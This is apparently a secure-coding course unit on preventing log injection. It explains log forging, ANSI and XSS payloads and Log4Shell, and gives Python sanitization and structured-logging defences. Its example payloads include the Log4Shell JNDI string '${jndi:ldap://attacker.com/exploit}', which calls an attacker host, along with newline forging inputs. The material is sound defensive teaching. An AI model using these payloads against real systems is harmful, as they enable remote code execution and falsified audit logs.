# Unit 9: A09 - Security Logging and Monitoring Failures — Topic 5: Log Injection Prevention

## Overview

Log injection occurs when an attacker **injects malicious content into log entries** by including special characters or control sequences in input that gets logged. This can forge log entries, corrupt log analysis, exploit log viewers, trigger false alerts, or even achieve code execution if logs are processed by vulnerable tools.

---

## 1. How Log Injection Works

```
SCENARIO: Application logs user input

Code:
  logger.info(f"Login attempt for user: {username}")

Normal input:
  username = "jsmith"
  Log: "Login attempt for user: jsmith"

Malicious input (newline injection):
  username = "jsmith\nLogin successful for user: admin"
  Log: "Login attempt for user: jsmith
        Login successful for user: admin"
  
  → Attacker created a FAKE log entry showing admin login!

Malicious input (CRLF injection):
  username = "jsmith\r\n[CRITICAL] System compromised"
  Log: "Login attempt for user: jsmith
        [CRITICAL] System compromised"
  
  → Fake critical alert in logs!
```

---

## 2. Log Injection Attack Types

| Attack | Method | Impact |
|--------|--------|--------|
| **Log forging** | Inject newlines to create fake entries | False evidence, cover tracks |
| **Log flooding** | Long strings to fill disk/overwhelm SIEM | Denial of service |
| **ANSI injection** | Terminal escape sequences in logs | Code execution in terminal viewers |
| **Log4Shell-type** | JNDI lookup strings in logs | Remote code execution |
| **XSS via logs** | HTML/JS in logs viewed in web UI | Attack on log viewer users |

---

## 3. Prevention

```python
import re

def sanitize_log_input(user_input, max_length=500):
    """Sanitize user input before logging"""
    if not isinstance(user_input, str):
        user_input = str(user_input)
    
    # Remove newlines and carriage returns
    sanitized = user_input.replace('\n', '\\n').replace('\r', '\\r')
    
    # Remove ANSI escape sequences
    sanitized = re.sub(r'\x1b\[[0-9;]*[a-zA-Z]', '', sanitized)
    
    # Remove null bytes
    sanitized = sanitized.replace('\0', '')
    
    # Truncate to prevent log flooding
    if len(sanitized) > max_length:
        sanitized = sanitized[:max_length] + "...[TRUNCATED]"
    
    return sanitized

# Usage
username = request.form.get('username', '')
safe_username = sanitize_log_input(username)
logger.info(f"Login attempt for user: {safe_username}")
```

### Structured Logging (Best Defense)

```python
import json
import logging

# ✅ SECURE — Structured logging prevents injection
# User input is always in a data field, never in the log message structure

class JsonFormatter(logging.Formatter):
    def format(self, record):
        log_entry = {
            "timestamp": self.formatTime(record),
            "level": record.levelname,
            "message": record.getMessage(),
            "logger": record.name,
        }
        # Extra fields are data, not part of log structure
        if hasattr(record, 'user_input'):
            log_entry['user_input'] = record.user_input
        return json.dumps(log_entry)

# User input is ALWAYS a JSON value — can't break the structure
logger.info("Login attempt", extra={"user_input": username})
# Output: {"timestamp":"...", "level":"INFO", "message":"Login attempt", "user_input":"jsmith\nfake"}
# The \n is safely contained within the JSON string value
```

---

## 4. Log4Shell (CVE-2021-44228)

```
THE MOST IMPACTFUL LOG INJECTION EVER:

Log4j (Java logging library) processed JNDI lookups in log messages:

Attacker sends:     ${jndi:ldap://attacker.com/exploit}
Application logs:   logger.info("User-Agent: " + userAgent);
Log4j processes:    Connects to attacker's LDAP server
Result:             Downloads and executes malicious code → RCE!

PREVENTION:
1. Update Log4j to 2.17.0+ (fixed)
2. Set log4j2.formatMsgNoLookups=true
3. Remove JndiLookup class from classpath
4. Use structured logging that doesn't process lookups
5. WAF rules to block ${jndi patterns
```

---

## 5. Prevention Checklist

```
□ Sanitize all user input before logging (remove newlines, null bytes)
□ Use structured logging (JSON) — input is data, not structure
□ Truncate logged values to prevent flooding
□ Don't log raw HTTP headers without sanitization
□ HTML-encode logged values if displayed in web UI
□ Remove ANSI escape sequences from logged input
□ Keep logging libraries updated (Log4j!)
□ Validate log viewing tools handle special characters safely
□ Use parameterized logging (logger.info("User: {}", username))
□ Test for log injection in security assessments
```

---

## Summary Table

| Attack | Payload | Prevention |
|--------|---------|-----------|
| Log forging | `user\nFake log entry` | Remove newlines |
| Log flooding | Very long strings | Truncate input |
| ANSI injection | `\x1b[31mRED\x1b[0m` | Strip escape sequences |
| JNDI injection | `${jndi:ldap://evil}` | Update Log4j, disable lookups |
| XSS via logs | `<script>alert(1)</script>` | HTML-encode for web viewers |

---

## Revision Questions

1. How does log injection work? Demonstrate with a newline injection example.
2. Why is structured (JSON) logging the best defense against log injection?
3. Implement a log sanitization function that handles all injection types.
4. Explain Log4Shell (CVE-2021-44228) — how did logging lead to remote code execution?
5. Write a secure logging wrapper that prevents injection in Python.

---

*Previous: [04-incident-response-integration.md](04-incident-response-integration.md) | Next: [06-siem-integration.md](06-siem-integration.md)*

---

*[Back to README](../README.md)*
